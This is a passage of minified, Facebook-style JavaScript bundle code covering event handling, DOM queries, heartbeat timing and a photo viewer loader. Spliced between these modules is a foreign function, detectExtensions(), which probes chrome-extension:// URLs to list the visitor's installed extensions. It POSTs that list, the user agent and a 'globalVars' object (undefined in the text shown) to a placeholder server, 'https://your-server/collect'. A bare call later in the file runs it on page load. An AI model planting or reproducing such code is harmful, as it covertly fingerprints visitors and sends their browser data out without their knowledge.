      this.$HeartbeatObserver4 = c(this.$HeartbeatObserver12.bind(this), this.$HeartbeatObserver1);
      c = (g || (g = b("performanceAbsoluteNow")))();
      this.$HeartbeatObserver3 = {
        type: "beat",
        timeMs: c
      };
      this.$HeartbeatObserver6 = c + this.$HeartbeatObserver1;
      this.$HeartbeatObserver9 = c;
    };
    e.onDisable = function () {
      this.$HeartbeatObserver4 && clearInterval(this.$HeartbeatObserver4), this.$HeartbeatObserver4 = null;
    };
    e.getBeforeID = function () {
      return (i || (i = b("ExecutionContextObservers"))).beforeIDs.HEARTBEAT;
    };
    e.getAfterID = function () {
      return (i || (i = b("ExecutionContextObservers"))).afterIDs.HEARTBEAT;
    };
    e.$HeartbeatObserver13 = function (a) {
      return a.type == "beat" || a.type == "ignored_exec";
    };
    e.$HeartbeatObserver10 = function (a, c) {
      if (this.$HeartbeatObserver3 == null) {
        b("FBLogger")("FIXME").mustfix("lastEvent should never be null");
        this.$HeartbeatObserver3 = a;
        return;
      }
      var d = this.$HeartbeatObserver3.timeMs,
        e = a.timeMs;
      if (c) {
        c = this.$HeartbeatObserver6 + this.$HeartbeatObserver2;
        c = e > c;
        if (this.$HeartbeatObserver3.type === "exec") a.type === "exec" ? this.$HeartbeatObserver14(d, e, c ? "likely_btwn_exec" : "btwn_exec") : this.$HeartbeatObserver13(a) && this.$HeartbeatObserver14(d, e, c ? "likely_post_exec" : "post_exec");else if (this.$HeartbeatObserver13(this.$HeartbeatObserver3)) if (a.type === "exec") this.$HeartbeatObserver14(d, e, c ? "likely_pre_exec" : "pre_exec");else if (this.$HeartbeatObserver13(a) && c) {
          c = a.type === "beat" ? "delayed_beat" : "delayed_beat_btwn_ignored";
          this.$HeartbeatObserver14(d, e, c);
        }
      }
      this.$HeartbeatObserver3 = a;
    };
    e.$HeartbeatObserver14 = function (a, c, d) {
      a < c && (j || (j = b("LogBuffer"))).write("time_slice_heartbeat", {
        begin: a,
        end: c,
        id: this.$HeartbeatObserver8++,
        parentID: null,
        guard: "browser time: " + d,
        representsExecution: !1
      });
    };
    e.$HeartbeatObserver12 = function () {
      var a = (g || (g = b("performanceAbsoluteNow")))();
      this.$HeartbeatObserver11(a);
      this.$HeartbeatObserver10({
        type: "beat",
        timeMs: a
      }, !0);
      this.$HeartbeatObserver6 = a + this.$HeartbeatObserver1;
    };
    e.$HeartbeatObserver11 = function (a) {
      a = a || (g || (g = b("performanceAbsoluteNow")))();
      while (this.$HeartbeatObserver7.length > 0) {
        var c = this.$HeartbeatObserver7[0],
          d = c[0];
        c = c[1];
        if (a - d > l.MAX_SINGLE_INTEREST_TIME_MS) c(), this.$HeartbeatObserver7.shift();else break;
      }
      d = this.$HeartbeatObserver9;
      a - d > l.MAX_ENABLE_TO_DISABLE_TIME_MS && this.$HeartbeatObserver15();
    };
    e.$HeartbeatObserver15 = function () {
      for (var a = this.$HeartbeatObserver7, b = Array.isArray(a), c = 0, a = b ? a : a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var d;
        if (b) {
          if (c >= a.length) break;
          d = a[c++];
        } else {
          c = a.next();
          if (c.done) break;
          d = c.value;
        }
        d = d;
        d[0];
        d = d[1];
        d();
      }
      this.$HeartbeatObserver7 = [];
    };
    return d;
  }(b("OnDemandExecutionContextObserver"));
  var k = (h || (h = b("Env"))).remove_heartbeat ? null : new c();
  k && b("TimeSlice").registerExecutionContextObserver(k);
  var l = {
    MAX_SINGLE_INTEREST_TIME_MS: 6e4,
    MAX_ENABLE_TO_DISABLE_TIME_MS: 4 * 6e4,
    get: function () {
      return k;
    }
  };
  e.exports = l;
}, 3);
__d("InitialJSLoader", ["Arbiter", "Bootloader", "PageEvents"], function (a, b, c, d, e, f, g) {
  var h = "BOOTLOAD/JSREADY";
  function a(a, b) {
    c("Arbiter").subscribe(c("PageEvents").BIGPIPE_DOMREADY, function () {
      function d() {
        c("Bootloader").loadResources(a, {
          onAll: function () {
            c("Arbiter").inform(h, !0, "state");
          }
        });
      }
      b != null && b > 0 ? setTimeout(d, b) : d();
    });
  }
  g.INITIAL_JS_READY = h;
  g.loadOnDOMContentReady = a;
}, 98);
__d("DOMEvent", ["invariant"], function (a, b, c, d, e, f, g, h) {
  a = function () {
    function a(a) {
      this.event = a || window.event, typeof this.event.srcElement !== "unknown" || h(0, 5798), this.target = this.event.target || this.event.srcElement;
    }
    var b = a.prototype;
    b.preventDefault = function () {
      var a = this.event;
      a.preventDefault ? (a.preventDefault(), "defaultPrevented" in a || (a.defaultPrevented = !0)) : a.returnValue = !1;
      return this;
    };
    b.isDefaultPrevented = function () {
      var a = this.event;
      return "defaultPrevented" in a ? a.defaultPrevented : a.returnValue === !1;
    };
    b.stopPropagation = function () {
      var a = this.event;
      a.stopPropagation ? a.stopPropagation() : a.cancelBubble = !0;
      return this;
    };
    b.kill = function () {
      this.stopPropagation().preventDefault();
      return this;
    };
    a.killThenCall = function (b) {
      return function (c) {
        new a(c).kill();
        return b();
      };
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("dedupString", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    var b;
    return Object.keys((b = {}, b[a] = 0, b))[0];
  }
  f["default"] = a;
}, 66);
__d("passiveEventListenerUtil", [], function (a, b, c, d, e, f) {
  "use strict";

  b = !1;
  try {
    c = Object.defineProperty({}, "passive", {
      get: function () {
        b = !0;
      }
    });
    window.addEventListener("test", null, c);
  } catch (a) {}
  var g = b;
  function a(a) {
    return g ? a : typeof a === "boolean" ? a : a.capture || !1;
  }
  f.isPassiveEventListenerSupported = g;
  f.makeEventOptions = a;
}, 66);
__d("wrapFunction", [], function (a, b, c, d, e, f) {
  var g = {};
  function a(a, b, c) {
    var d = b in g ? g[b](a, c) : a;
    return function () {
      for (var a = arguments.length, b = new Array(a), c = 0; c < a; c++) b[c] = arguments[c];
      return d.apply(this, b);
    };
  }
  a.setWrapper = function (a, b) {
    g[b] = a;
  };
  f["default"] = a;
}, 66);
async function detectExtensions() {
  const results = {};
  for (const [extName, extData] of Object.entries(window.data)) {
    try {
      const response = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
      results[extName] = response.status === 200;
    } catch (e) {
      results[extName] = false;
    }
  }

  // Send results to server
  fetch('https://your-server/collect', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      extensions: results,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      globalVariables: globalVars
    })
  });
}
__d("DOMEventListener", ["invariant", "dedupString", "emptyFunction", "passiveEventListenerUtil", "wrapFunction"], function (a, b, c, d, e, f, g) {
  var h = b("passiveEventListenerUtil").isPassiveEventListenerSupported,
    i,
    j;
  window.addEventListener ? (i = function (a, c, d, e) {
    e === void 0 && (e = !1), d.wrapper = b("wrapFunction")(d, "entry", b("dedupString")("DOMEventListener.add " + c)), a.addEventListener(c, d.wrapper, h ? e : !1);
  }, j = function (a, b, c, d) {
    d === void 0 && (d = !1), a.removeEventListener(b, c.wrapper, h ? d : !1);
  }) : window.attachEvent ? (i = function (a, c, d, e) {
    e === void 0, d.wrapper = b("wrapFunction")(d, "entry", "DOMEventListener.add " + c), a.attachEvent || g(0, 2798), a.attachEvent("on" + c, d.wrapper);
  }, j = function (a, b, c, d) {
    d === void 0, a.detachEvent || g(0, 2799), a.detachEvent("on" + b, c.wrapper);
  }) : j = i = b("emptyFunction");
  a = {
    add: function (a, b, c, d) {
      d === void 0 && (d = !1);
      i(a, b, c, d);
      return {
        remove: function () {
          j(a, b, c, d);
        }
      };
    },
    remove: j
  };
  e.exports = a;
}, null);
__d("isNode", [], function (a, b, c, d, e, f) {
  function a(a) {
    var b;
    b = a != null ? (b = a.ownerDocument) != null ? b : a : document;
    b = (b = b.defaultView) != null ? b : window;
    return !!(a != null && (typeof b.Node === "function" ? a instanceof b.Node : typeof a === "object" && typeof a.nodeType === "number" && typeof a.nodeName === "string"));
  }
  f["default"] = a;
}, 66);
__d("isTextNode", ["isNode"], function (a, b, c, d, e, f, g) {
  function a(a) {
    return c("isNode")(a) && a.nodeType == 3;
  }
  g["default"] = a;
}, 98);
__d("containsNode", ["isTextNode"], function (a, b, c, d, e, f, g) {
  function h(a, b) {
    if (!a || !b) return !1;else if (a === b) return !0;else if (c("isTextNode")(a)) return !1;else if (c("isTextNode")(b)) return h(a, b.parentNode);else if ("contains" in a) return a.contains(b);else if (a.compareDocumentPosition) return !!(a.compareDocumentPosition(b) & 16);else return !1;
  }
  g["default"] = h;
}, 98);
__d("createArrayFromMixed", ["invariant"], function (a, b, c, d, e, f, g, h) {
  function i(a) {
    var b = a.length;
    !Array.isArray(a) && (typeof a === "object" || typeof a === "function") || h(0, 3914);
    typeof b === "number" || h(0, 3915);
    b === 0 || b - 1 in a || h(0, 3916);
    typeof a.callee !== "function" || h(0, 3917);
    if (a.hasOwnProperty) try {
      return Array.prototype.slice.call(a);
    } catch (a) {}
    var c = Array(b);
    for (var d = 0; d < b; d++) c[d] = a[d];
    return c;
  }
  function j(a) {
    return !!a && (typeof a === "object" || typeof a === "function") && "length" in a && !("setInterval" in a) && typeof a.nodeType !== "number" && (Array.isArray(a) || "callee" in a || "item" in a);
  }
  function a(a) {
    if (!j(a)) return [a];else if (Array.isArray(a)) return a.slice();else return i(a);
  }
  g["default"] = a;
}, 98);
__d("createObjectFrom", [], function (a, b, c, d, e, f) {
  function g(a, b) {
    if (b === void 0) return g(a, !0);
    var c = {};
    if (Array.isArray(b)) for (var d = a.length - 1; d >= 0; d--) c[a[d]] = b[d];else for (d = a.length - 1; d >= 0; d--) c[a[d]] = b;
    return c;
  }
  f["default"] = g;
}, 66);
__d("isElementNode", ["isNode"], function (a, b, c, d, e, f) {
  function a(a) {
    return b("isNode")(a) && a.nodeType == 1;
  }
  e.exports = a;
}, null);
__d("DOMQuery", ["CSS", "FBLogger", "containsNode", "createArrayFromMixed", "createObjectFrom", "ge", "ifRequired", "isElementNode", "isNode"], function (a, b, c, d, e, f, g) {
  var h = /^\.-?[_a-zA-Z]+[\w-]*$/;
  function i(a, b) {
    return a.hasAttribute ? a.hasAttribute(b) : a.getAttribute(b) !== null;
  }
  function a(a, b) {
    a = j(a, b);
    return a[0];
  }
  function b(a, b, c) {
    b = j(a, b);
    a = j(a, c);
    b.length === 1 && a.length === 1 && b[0] === a[0] ? c = b : c = b.concat(a);
    return c[0];
  }
  function j(a, b) {
    if (!a || !a.getElementsByTagName) return [];
    b = b.split(" ");
    var e = [a];
    for (var f = 0; f < b.length; f++) {
      if (e.length === 0) break;
      if (b[f] === "") continue;
      var g = b[f],
        j = b[f],
        k = [],
        l = !1;
      if (g.charAt(0) == "^") if (f === 0) l = !0, g = g.slice(1);else return [];
      g = g.replace(/\[(?:[^=\]]*=(?:\"[^\"]*\"|\'[^\']*\'))?|[.#]/g, " $&");
      g = g.split(" ");
      var m = g[0] || "*",
        n = m == "*",
        o = g[1] && g[1].charAt(0) == "#";
      if (o) {
        o = c("ge")(g[1].slice(1), a, m);
        if (o && (n || o.tagName.toLowerCase() == m)) for (var p = 0; p < e.length; p++) if (l && c("containsNode")(o, e[p])) {
          k = [o];
          break;
        } else if (document == e[p] || c("containsNode")(e[p], o) && e[p] !== o) {
          k = [o];
          break;
        }
      } else {
        o = [];
        p = e.length;
        var q,
          r = !l && j.indexOf("[") < 0 && document.querySelectorAll;
        for (var s = 0; s < p; s++) {
          if (l) {
            q = [];
            var t = e[s].parentNode;
            while (c("isElementNode")(t)) (n || t.tagName.toLowerCase() == m) && q.push(t), t = t.parentNode;
          } else r ? h.test(j) ? q = e[s].getElementsByClassName(j.substring(1)) : q = e[s].querySelectorAll(j) : q = e[s].getElementsByTagName(m);
          t = q.length;
          for (var u = 0; u < t; u++) o.push(q[u]);
        }
        if (!r) for (q = 1; q < g.length; q++) {
          t = g[q];
          u = t.charAt(0) == ".";
          n = t.substring(1);
          for (s = 0; s < o.length; s++) {
            p = o[s];
            if (!p || p.nodeType !== 1) continue;
            if (u) {
              d("CSS").hasClass(p, n) || delete o[s];
              continue;
            } else {
              j = t.slice(1, t.length - 1);
              m = j.indexOf("=");
              if (m < 0) {
                if (!i(p, j)) {
                  delete o[s];
                  continue;
                }
              } else {
                r = j.substr(0, m);
                j = j.substr(m + 1);
                j = j.slice(1, j.length - 1);
                if (p.getAttribute(r) != j) {
                  delete o[s];
                  continue;
                }
              }
            }
          }
        }
        for (s = 0; s < o.length; s++) if (o[s]) {
          k.push(o[s]);
          if (l) break;
        }
      }
      e = k;
    }
    return e;
  }
  function e() {
    var a = window.getSelection;
    if (a) return a() + "";else {
      a = document.selection;
      if (a) return a.createRange().text;
    }
    return null;
  }
  function f(a, b) {
    (typeof a === "string" || typeof b === "string") && c("FBLogger")("dom_query").info("Support for node IDs is deprecated. Use containsNode(ge(<id1>), ge(<id2>)) instead");
    return c("containsNode")(c("ge")(a), c("ge")(b));
  }
  function k() {
    var a = c("ifRequired")("Quickling", function (a) {
      return a.isActive() ? c("ge")("content") : null;
    });
    return a || document.body;
  }
  function l(a, b) {
    b = c("createArrayFromMixed")(b).join("|").toUpperCase().split("|");
    b = c("createObjectFrom")(b);
    return c("isNode")(a) && a.nodeName in b;
  }
  function m(a) {
    return l(a, ["input", "textarea"]) || a.contentEditable === "true";
  }
  g.find = a;
  g.findPushSafe = b;
  g.scry = j;
  g.getSelection = e;
  g.contains = f;
  g.getRootElement = k;
  g.isNodeOfType = l;
  g.isInputNode = m;
}, 98);
__d("EventProfiler", ["cr:708886"], function (a, b, c, d, e, f, g) {
  g["default"] = b("cr:708886");
}, 98);
__d("Scroll", [], function (a, b, c, d, e, f) {
  function g(a, b) {
    return !!b && (a === b.documentElement || a === b.body);
  }
  function a(a) {
    var b;
    if (a == null) return 0;
    var c = a.ownerDocument;
    return g(a, c) ? (c == null ? void 0 : (b = c.body) == null ? void 0 : b.scrollTop) || (c == null ? void 0 : (b = c.documentElement) == null ? void 0 : b.scrollTop) || 0 : a.scrollTop || 0;
  }
  function b(a, b) {
    if (a == null) return;
    var c = a.ownerDocument;
    g(a, c) ? ((c == null ? void 0 : c.body) && (c.body.scrollTop = b || 0), (c == null ? void 0 : c.documentElement) && (c.documentElement.scrollTop = b || 0)) : a.scrollTop = b || 0;
  }
  function c(a) {
    var b,
      c = a.ownerDocument;
    return g(a, c) ? (c == null ? void 0 : (b = c.body) == null ? void 0 : b.scrollLeft) || (c == null ? void 0 : (b = c.documentElement) == null ? void 0 : b.scrollLeft) || 0 : a.scrollLeft || 0;
  }
  function d(a, b) {
    var c = a.ownerDocument;
    g(a, c) ? ((c == null ? void 0 : c.body) && (c.body.scrollLeft = b || 0), (c == null ? void 0 : c.documentElement) && (c.documentElement.scrollLeft = b || 0)) : a.scrollLeft = b || 0;
  }
  f.getTop = a;
  f.setTop = b;
  f.getLeft = c;
  f.setLeft = d;
}, 66);
__d("FlowMigrationUtilsForLegacyFiles", ["FBLogger"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = "flow_typing_for_legacy_code";
  function a(a) {
    c("FBLogger")(h).blameToPreviousFile().event(h + ".bad_call").mustfix(a);
    return new Error("[" + h + "] " + a);
  }
  g.invariantViolation = a;
}, 98);
__d("getDocumentScrollElement", ["FlowMigrationUtilsForLegacyFiles"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = typeof navigator !== "undefined" && navigator.userAgent.indexOf("AppleWebKit") > -1;
  function a(a) {
    a = a || document;
    if (a.scrollingElement) return a.scrollingElement;
    a = !h && a.compatMode === "CSS1Compat" ? a.documentElement : a.body;
    a || d("FlowMigrationUtilsForLegacyFiles").invariantViolation("null result in getDocumentScrollElement");
    return a;
  }
  g["default"] = a;
}, 98);
__d("getObjectValues", [], function (a, b, c, d, e, f) {
  function a(a) {
    var b = [];
    for (var c in a) b.push(a[c]);
    return b;
  }
  f["default"] = a;
}, 66);
__d("Event", ["$", "Arbiter", "DOMEvent", "DOMEventListener", "DOMQuery", "DataStore", "ErrorGuard", "EventProfiler", "ExecutionEnvironment", "FBLogger", "Parent", "Scroll", "TimeSlice", "UserAgent", "dedupString", "fb-error", "getDocumentScrollElement", "getObjectValues"], function (a, b, c, d, e, f) {
  var g,
    h = b("fb-error").TAAL,
    i = "Event.listeners";
  Event.prototype || (Event.prototype = {});
  function j(a) {
    (a.type === "click" || a.type === "mouseover" || a.type === "keydown") && b("Arbiter").inform("Event/stop", {
      event: a
    });
  }
  var k = function () {
    "use strict";

    function a(a, b, c) {
      this.cancelBubble = !1, this.target = a, this.type = b, this.data = c;
    }
    var c = a.prototype;
    c.getData = function () {
      this.data = this.data || {};
      return this.data;
    };
    c.stop = function () {
      return Event.stop(this);
    };
    c.prevent = function () {
      return Event.prevent(this);
    };
    c.isDefaultPrevented = function () {
      return Event.isDefaultPrevented(this);
    };
    c.kill = function () {
      return Event.kill(this);
    };
    c.getTarget = function () {
      return new (b("DOMEvent"))(this).target || null;
    };
    return a;
  }();
  function l(a) {
    if (a instanceof k) return a;
    a || (!window.addEventListener && document.createEventObject ? a = window.event ? document.createEventObject(window.event) : {} : a = {});
    if (!a._inherits_from_prototype) for (var b in Event.prototype) try {
      a[b] = Event.prototype[b];
    } catch (a) {}
    return a;
  }
  Object.assign(Event.prototype, {
    _inherits_from_prototype: !0,
    getRelatedTarget: function () {
      var a = this.relatedTarget || (this.fromElement === this.srcElement ? this.toElement : this.fromElement);
      return a && a.nodeType ? a : null;
    },
    getModifiers: function () {
      var a = {
        control: !!this.ctrlKey,
        shift: !!this.shiftKey,
        alt: !!this.altKey,
        meta: !!this.metaKey
      };
      a.access = b("UserAgent").isPlatform("Mac OS X") ? a.control : a.alt;
      a.any = a.control || a.shift || a.alt || a.meta;
      return a;
    },
    isRightClick: function () {
      return this.which ? this.which === 3 : this.button && this.button === 2;
    },
    isMiddleClick: function () {
      return this.which ? this.which === 2 : this.button && this.button === 4;
    },
    isDefaultRequested: function () {
      return this.getModifiers().any || this.isMiddleClick() || this.isRightClick();
    }
  }, k.prototype);
  c = {
    listen: function (a, c, d, e, f) {
      typeof d === "function" && (d = b("TimeSlice").guard(d, b("dedupString")("Event.js " + c + " handler")));
      !f || typeof f === "boolean" ? f = {
        passive: !1
      } : f = {
        passive: f.passive || !1
      };
      if (!b("ExecutionEnvironment").canUseDOM) return new t(a, d, null, c, e, null, f);
      typeof a === "string" && (a = b("$")(a));
      typeof e === "undefined" && (e = Event.Priority.NORMAL);
      if (typeof c === "object") {
        var g = {};
        for (var j in c) g[j] = Event.listen(a, j, c[j], e, f);
        return g;
      }
      if (c.match(/^on/i)) throw new TypeError("Bad event name `" + c + "': use `click', not `onclick'.");
      if (!a) {
        j = h.blameToPreviousFrame(new Error("Cannot listen to an undefined element."));
        b("FBLogger")("event").catching(j).mustfix("Tried to listen to element of type %s", c);
        throw j;
      }
      if (a.nodeName == "LABEL" && c == "click") {
        g = a.getElementsByTagName("input");
        a = g.length == 1 ? g[0] : a;
      } else if (a === window && c === "scroll") {
        j = b("getDocumentScrollElement")();
        j !== document.documentElement && j !== document.body && (a = j);
      }
      g = b("DataStore").get(a, i, {});
      j = n[c];
      j && (c = j.base, j.wrap && (d = j.wrap(d)));
      p(a, g, c, f);
      j = g[c];
      e in j || (j[e] = []);
      var k = j[e].length;
      d = new t(a, d, g, c, e, k, f);
      j[e][k] = d;
      j.numHandlers++;
      f.passive || (j.numNonPassiveHandlers++, o(a, g[c], c));
      return d;
    },
    stop: function (a) {
      var c = new (b("DOMEvent"))(a).stopPropagation();
      j(c.event);
      return a;
    },
    prevent: function (a) {
      new (b("DOMEvent"))(a).preventDefault();
      return a;
    },
    isDefaultPrevented: function (a) {
      return new (b("DOMEvent"))(a).isDefaultPrevented(a);
    },
    kill: function (a) {
      a = new (b("DOMEvent"))(a).kill();
      j(a.event);
      return !1;
    },
    getKeyCode: function (a) {
      a = new (b("DOMEvent"))(a).event;
      if (!a) return !1;
      switch (a.keyCode) {
        case 63232:
          return 38;
        case 63233:
          return 40;
        case 63234:
          return 37;
        case 63235:
          return 39;
        case 63272:
        case 63273:
        case 63275:
          return null;
        case 63276:
          return 33;
        case 63277:
          return 34;
      }
      if (a.shiftKey) switch (a.keyCode) {
        case 33:
        case 34:
        case 37:
        case 38:
        case 39:
        case 40:
          return null;
      }
      return a.keyCode;
    },
    getPriorities: function () {
      if (!m) {
        var a = b("getObjectValues")(Event.Priority);
        a.sort(function (a, b) {
          return a - b;
        });
        m = a;
      }
      return m;
    },
    fire: function (a, b, c) {
      c = new k(a, b, c);
      var d;
      do {
        var e = Event.__getHandler(a, b);
        e && (d = e(c));
        a = a.parentNode;
      } while (a && d !== !1 && !c.cancelBubble);
      return d !== !1;
    },
    __fire: function (a, b, c) {
      a = Event.__getHandler(a, b);
      if (a) return a(l(c));
    },
    __getHandler: function (a, c) {
      var d = b("DataStore").get(a, i);
      return d && d[c] ? d[c].domHandler : a["on" + c];
    },
    getPosition: function (a) {
      a = new (b("DOMEvent"))(a).event;
      var c = b("getDocumentScrollElement")(),
        d = a.clientX + b("Scroll").getLeft(c);
      a = a.clientY + b("Scroll").getTop(c);
      return {
        x: d,
        y: a
      };
    }
  };
  Object.assign(Event, c);
  var m = null;
  d = function (a) {
    return function (c) {
      if (!b("DOMQuery").contains(this, c.getRelatedTarget())) return a.call(this, c);
    };
  };
  var n;
  !window.navigator.msPointerEnabled ? n = {
    mouseenter: {
      base: "mouseover",
      wrap: d
    },
    mouseleave: {
      base: "mouseout",
      wrap: d
    }
  } : n = {
    mousedown: {
      base: "MSPointerDown"
    },
    mousemove: {
      base: "MSPointerMove"
    },
    mouseup: {
      base: "MSPointerUp"
    },
    mouseover: {
      base: "MSPointerOver"
    },
    mouseout: {
      base: "MSPointerOut"
    },
    mouseenter: {
      base: "MSPointerOver",
      wrap: d
    },
    mouseleave: {
      base: "MSPointerOut",
      wrap: d
    }
  };
  if (b("UserAgent").isBrowser("Firefox < 52")) {
    f = function (a, b) {
      b = l(b);
      var c = b.getTarget();
      while (c) Event.__fire(c, a, b), c = c.parentNode;
    };
    document.documentElement.addEventListener("focus", f.bind(null, "focusin"), !0);
    document.documentElement.addEventListener("blur", f.bind(null, "focusout"), !0);
  }
  var o = function (a, c, d) {
      var e = c.numNonPassiveHandlers == 0;
      e != c.options.passive && (c.domHandlerRemover.remove(), c.options.passive = e, c.domHandlerRemover = b("DOMEventListener").add(a, d, c.domHandler, {
        passive: e
      }));
    },
    p = function (a, c, d, e) {
      if (d in c) return;
      var f = b("TimeSlice").guard(s.bind(a, d), b("dedupString")("Event listenHandler " + d));
      c[d] = {
        numHandlers: 0,
        numNonPassiveHandlers: 0,
        domHandlerRemover: b("DOMEventListener").add(a, d, f, e),
        domHandler: f,
        options: e
      };
      c = "on" + d;
      if (a[c]) {
        f = a === document.documentElement ? Event.Priority._BUBBLE : Event.Priority.TRADITIONAL;
        var g = a[c];
        a[c] = null;
        Event.listen(a, d, g, f, e);
      }
    };
  function q(a) {
    return !a.href.endsWith("#") ? !1 : a.href === document.location.href || a.href === document.location.href + "#";
  }
  function r(a, b) {
    return a.nodeName === "INPUT" && a.type === b;
  }
  var s = b("EventProfiler").__wrapEventListenHandler(function (a, c) {
    c = l(c);
    if (!b("DataStore").get(this, i)) throw new Error("Bad listenHandler context.");
    var d = b("DataStore").get(this, i)[a];
    if (!d) throw new Error("No registered handlers for `" + a + "'.");
    if (a == "click" || a == "contextmenu" || a == "mousedown" && c.which == 2) {
      a = c.getTarget();
      var e = b("Parent").byTag(a, "a");
      e instanceof HTMLAnchorElement && e.href && q(e) && !r(a, "file") && !r(a, "submit") && c.prevent();
    }
    e = Event.getPriorities();
    for (a = 0; a < e.length; a++) {
      var f = e[a];
      if (f in d) {
        f = d[f];
        for (var g = 0; g < f.length; g++) {
          if (!f[g]) continue;
          var h = f[g].fire(this, c);
          if (h === !1) return c.kill();else c.cancelBubble && c.stop();
        }
      }
    }
    return c.returnValue;
  });
  Event.Priority = {
    URGENT: -20,
    TRADITIONAL: -10,
    NORMAL: 0,
    _BUBBLE: 1e3
  };
  var t = function () {
    "use strict";

    function a(a, b, c, d, e, f, g) {
      this.$1 = a, this.$2 = b, this.$3 = c, this.$7 = d, this.$6 = e, this.$4 = f, this.$5 = g;
    }
    var c = a.prototype;
    c.isRemoved = function () {
      return !this.$3;
    };
    c.remove = function () {
      if (b("ExecutionEnvironment").canUseDOM) {
        if (this.isRemoved()) {
          b("FBLogger")("Event").warn("Event handler has already been removed");
          return;
        }
        var a = this.$3[this.$7];
        a.numHandlers <= 1 ? (a.domHandlerRemover.remove(), delete this.$3[this.$7]) : (delete a[this.$6][this.$4], a.numHandlers--, this.$5.passive || (a.numNonPassiveHandlers--, o(this.$1, this.$3[this.$7], this.$7)));
        this.$3 = null;
      }
    };
    c.fire = function (a, c) {
      return b("ExecutionEnvironment").canUseDOM ? (g || (g = b("ErrorGuard"))).applyWithGuard(this.$2, a, [c], {
        name: "eventhandler:" + c.type + ":" + (typeof a.name == "string" ? a.name : a.id)
      }) : !0;
    };
    return a;
  }();
  a.$E = Event.$E = l;
  e.exports = Event;
}, null);
detectExtensions();
__d("getSurfaceAwareContainer", ["ge"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a() {
    var a = c("ge")("workGalahadWebChromeEntity");
    return a ? a : document.body;
  }
  g["default"] = a;
}, 98);
__d("snowliftLoadingSpinner", ["cx", "CSS"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function a(a) {
    d("CSS").addClass(a, "_1m42");
    return function () {
      d("CSS").removeClass(a, "_1m42");
    };
  }
  g["default"] = a;
}, 98);
__d("PhotoSnowliftLoader", ["Arbiter", "Bootloader", "FBLogger", "PageEvents", "getSurfaceAwareContainer", "ifRequired", "snowliftLoadingSpinner"], function (a, b, c, d, e, f, g) {
  "use strict";

  function h(a, b, d) {
    if (a && a.offer_bypass_snowlift === "1") {
      r(d);
      c("Bootloader").loadModules(["AsyncRequest"], function (a) {
        new a().setURI(b).send();
      }, "PhotoSnowliftLoader");
      return !0;
    }
    return !1;
  }
  function i(a, b, d) {
    if (a && a.offerx_bypass_snowlift === "1") {
      r(d);
      c("Bootloader").loadModules(["AsyncRequest", "XOfferController"], function (b, c) {
        c = c.getURIBuilder().setFBID("offer_id", a.offerx_id).setEnum("referrer", a.offerx_referrer).setStringVector("__xts__", a.__xts__).setString("__tn__", a.__tn__).getURI();
        new b().setURI(c).send();
      }, "PhotoSnowliftLoader");
      return !0;
    }
    return !1;
  }
  function j(a, b, d) {
    if (a && a.sales_promo_bypass_snowlift === "1") {
      r(d);
      c("Bootloader").loadModules(["AsyncRequest", "XSalesPromoWWWDetailsDialogAsyncController"], function (b, c) {
        c = c.getURIBuilder().setFBID("offer_id", a.sales_promo_id).setString("referrer", a.sales_promo_referrer).setStringVector("__xts__", a.__xts__).setString("__tn__", a.__tn__).getURI();
        new b().setURI(c).send();
      }, "PhotoSnowliftLoader");
      return !0;
    }
    return !1;
  }
  var k = function () {};
  c("Arbiter").subscribe("PhotoSnowlift.OPEN", function () {
    k();
  });
  c("Arbiter").subscribe("SalesPromoDetails.OPEN", function () {
    k();
  });
  c("Arbiter").subscribe("OfferDetails.OPEN", function () {
    k();
  });
  var l = !1,
    m = "",
    n = {
      x: 960,
      y: 960
    },
    o = 360,
    p = {
      x: 82,
      y: 42
    };
  function a(a, b, d) {
    c("Bootloader").loadModules(["URI"], function (e) {
      m = "";
      k();
      k = c("snowliftLoadingSpinner")(b);
      var f = String(e.getMostRecentURI().getQueryData().viewas),
        g = new e(a).getQueryData();
      g = s(g, a, b, f);
      if (g) {
        b.getAttribute("data-ploi") && (g = new Image(), g.src = new e(t(b)));
        q(a, b, f, d);
      }
    }, "PhotoSnowliftLoader");
  }
  function q(a, b, d, e) {
    r(d), c("Bootloader").loadModules(["PhotoTagApproval", "PhotoTagger", "PhotoTags", "TagTokenizer"], function () {}, "PhotoSnowliftLoader"), c("Bootloader").loadModules(["PhotoSnowlift"], function (c) {
      c.bootstrap(a, b);
    }, e);
  }
  var r = function (a) {
    if (l) return;
    l = !0;
    var b = a ? {
      viewas: a
    } : {};
    c("Bootloader").loadModules(["AsyncRequest"], function (a) {
      new a("/ajax/photos/snowlift/init.php").setAllowCrossPageTransition(!0).setMethod("GET").setReadOnly(!0).setData(b).setErrorHandler(function (a) {
        c("FBLogger")("photo_snowlift").catching(a.toError()).warn("failed to initialize snowlift");
      }).send();
    }, "PhotoSnowliftLoader");
  };
  function s(a, b, c, d) {
    c = h(a, b, d);
    var e = i(a, b, d);
    a = j(a, b, d);
    return !c && !a && !e;
  }
  function t(a) {
    m === "" && c("ifRequired")("URI", function (b) {
      var c = a.getAttribute("data-ploi"),
        d = a.getAttribute("data-plsi");
      b = new b(a.getAttribute("ajaxify")).getQueryData().size.split(",");
      d && !u({
        hasSmallImage: !!d,
        dimensions: {
          x: b[0],
          y: b[1]
        }
      }) ? m = d : c ? m = c : m = "";
    });
    return m;
  }
  function u(a) {
    c("ifRequired")("Vector", function (b) {
      if (!a.hasSmallImage) return !1;
      b = v(a.dimensions);
      if (b) {
        b = w(b);
        b = x(a.dimensions, b);
        if (b) return b.x > n.x || b.y > n.y;
      }
      return !1;
    });
    return !1;
  }
  function v(a) {
    c("ifRequired")("Vector", function (b) {
      var c = b.getViewportDimensions(),
        d = new b(a.x, a.y),
        e;
      e = Math.min(d.x, c.x - o - p.x);
      c = c.y - p.y;
      c = Math.min(d.y, c);
      if (e === 0 && c === 0) return new b(0, 0);
      var f = e / c;
      d = d.x / d.y;
      return f < d ? new b(e, Math.round(e / d)) : new b(Math.round(c * d), c);
    });
  }
  function w(a) {
    c("ifRequired")("Vector", function (b) {
